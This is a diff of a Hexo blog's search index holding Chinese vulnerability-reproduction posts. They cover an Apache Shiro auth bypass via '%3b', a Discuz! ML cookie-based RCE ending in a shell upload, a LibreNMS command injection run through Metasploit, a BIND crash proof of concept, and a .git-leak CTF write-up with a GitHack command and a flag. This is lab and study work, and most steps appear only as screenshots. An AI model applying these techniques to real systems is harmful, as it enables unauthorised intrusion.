+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>librenms</tag>
       </tags>
   </entry>
   <entry>
@@ -893,66 +1023,82 @@
       </tags>
   </entry>
   <entry>
-    <title>0x07cve-2020-13933复现</title>
-    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
-<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
+    <title>0x0Dcve-2019-13956</title>
+    <url>/2020/11/12/0x0Dcve-2019-13956/</url>
+    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
 <a id="more"></a>
 
-<p>然后运行，访问，抓包即可</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
-<p>访问test，成功</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
-<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
-<p>进行%3b的操作，绕过登录访问到了页面内容</p>
-<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
+<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
+<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
+<p>然后开PHPstudy往里一放即可到网页上Install</p>
+<p>点击链接抓包改包</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
+<p>可以看到缓存里的内容被更改了</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
+<p>上传shell</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
+<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
+<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
+<p>include_once：</p>
+<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
+<p>跟进template函数：</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
+<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
+<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
+<p>DISCUZ_LANG和$lng有关</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
+<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>apaches shiro</tag>
+        <tag>discuz</tag>
       </tags>
   </entry>
   <entry>
-    <title>0x0Ccve-2019-10669</title>
-    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
-    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
-<a id="more"></a>
+    <title>CTF-2020.6.12</title>
+    <url>/2020/06/12/CTF-2020.6.12/</url>
+    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
+<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>
 
-<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
-<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
-<p>攻击环境就准备好了</p>
-<p>靶机环境：</p>
-<p>本来想下软件装，装了好几次不成功</p>
-<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
-<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
-<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
-<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
-<p>需要在ubuntu换源更新下载安装一条龙</p>
-<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
-<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
-<p>也能打成功了</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
-<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
-<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
-<p>passthru — 执行外部程序并且显示原始输出</p>
-<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
-<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
+<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
+<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
+<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
+<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
+<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
+<p>详细解释：</p>
+<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
+<p>当开发时采用以下流程时：</p>
+<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
+<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
+<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
+<p>2、爬虫爬取整个git目录</p>
+<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
+<p>2、在每次Pull后删除.git文件夹</p>
+<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
+<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
+<p>可扫描出.git漏洞</p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
+<p>点击后：</p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
+<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
+<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
+<p>仔细看差别：</p>
+<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
+<p>提交即可</p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>librenms</tag>
+        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -1010,48 +1156,6 @@
       </categories>
       <tags>
         <tag>加密与解密</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF-2020.6.12</title>
-    <url>/2020/06/12/CTF-2020.6.12/</url>
-    <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
-<h5 id="0x1-一些用语解释："><a href="#0x1-一些用语解释：" class="headerlink" title="0x1 一些用语解释："></a>0x1 一些用语解释：</h5><a id="more"></a>
-
-<p>集中式：全部文件存在一个中央服务器中，需联网，修改时从中央服务器中取出修改完放回去。</p>
-<p>分布式：各个电脑里都有完整的版本库，修改后需推送，安全性高，可以有一个中央服务器用来方便大家交换修改的版本。</p>
-<p>版本库：仓库，目录，文件的修改删除git都可跟踪</p>
-<p>工作区和暂存区：工作区就是自身电脑可看到的目录，暂存区在版本库中，将工作区的文件添加到暂存区（git add），然后将暂存区的所有文件添加到master（git commit）。master也是分支，分支的作用是上传未写完的代码后不会让未写完的代码影响别人。</p>
-<h5 id="0x2-泄露原理："><a href="#0x2-泄露原理：" class="headerlink" title="0x2 泄露原理："></a>0x2 泄露原理：</h5><p>源码提交到远程托管网站后，从上面把源码pull到服务器时，忘记删除git文件。利用.git文件可以恢复网站的源码，源码里可能会有数据库信息。/使用git进行版本控制，对站点自动部署，配置不当会降.git文件夹直接部署到线上环境。</p>
-<p>详细解释：</p>
-<p>在一个目录中初始化后，会产生一个名叫.git的隐藏文件夹（版本库）</p>
-<p>当开发时采用以下流程时：</p>
-<p>1.初始化仓库 , 并将仓库托管在Coding或者Github上 , 便于远程协作/备份/部署<br>2.在本地进行网站开发 , 并定时提交commit , push到远程托管网站<br>3.当一个阶段的开发差不多的时候 , 需要远程登陆服务器 , 通过托管网站再将发行版网站pull到Web目录下（此时会将,git文件夹下载到服务器的web目录下）<br>4.网站正常运行</p>
-<p>攻击者可以利用web目录下载Git文件夹，然后就可以利用储存的版本控制信息，完全恢复网站后台的代码和目录结构以及获取数据库信息等。</p>
-<h5 id="0x3-利用："><a href="#0x3-利用：" class="headerlink" title="0x3 利用："></a>0x3 利用：</h5><p>1、githack等：同构泄露的.git文件夹下的文件，还原重建工程源代码</p>
-<p>2、爬虫爬取整个git目录</p>
-<h5 id="0x4-修复："><a href="#0x4-修复：" class="headerlink" title="0x4 修复："></a>0x4 修复：</h5><p>1、对.git目录的访问权限进行控制</p>
-<p>2、在每次Pull后删除.git文件夹</p>
-<h5 id="0x5-利用场景实践："><a href="#0x5-利用场景实践：" class="headerlink" title="0x5 利用场景实践："></a>0x5 利用场景实践：</h5><p>git_extract下载：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
-<p>cmd命令：git_extract.py  <a href="http://xxxxx/.git/">http://xxxxx/.git/</a></p>
-<p>可扫描出.git漏洞</p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612152136482.png"></p>
-<p>点击后：</p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105110264.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105221000.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105306274.png"></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20200612154814555.png"></p>
-<p>放到beyond compare（<a href="http://www.scootersoftware.com/download.php%EF%BC%89%E9%87%8C%E5%AF%B9%E6%AF%94">http://www.scootersoftware.com/download.php）里对比</a></p>
-<p><img src="/2020/06/12/CTF-2020.6.12/image-20201109105349980.png"></p>
-<p>仔细看差别：</p>
-<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
-<p>提交即可</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -1120,66 +1224,6 @@
       </categories>
       <tags>
         <tag>恶意代码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x0ACVE-2020-8617复现</title>
-    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
-<a id="more"></a>
-
-<p>0x1 下载docker镜像后运行（服务器环境）</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
-<p>0x2 安装pipenv</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
-<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
-<p>0x4 流量包情况</p>
-<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>pipenv</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x0Dcve-2019-13956</title>
-    <url>/2020/11/12/0x0Dcve-2019-13956/</url>
-    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
-<a id="more"></a>
-
-<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
-<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
-<p>然后开PHPstudy往里一放即可到网页上Install</p>
-<p>点击链接抓包改包</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
-<p>可以看到缓存里的内容被更改了</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
-<p>上传shell</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
-<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
-<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
-<p>include_once：</p>
-<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
-<p>跟进template函数：</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
-<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
-<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
-<p>DISCUZ_LANG和$lng有关</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
-<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>discuz</tag>
       </tags>
   </entry>
 </search>
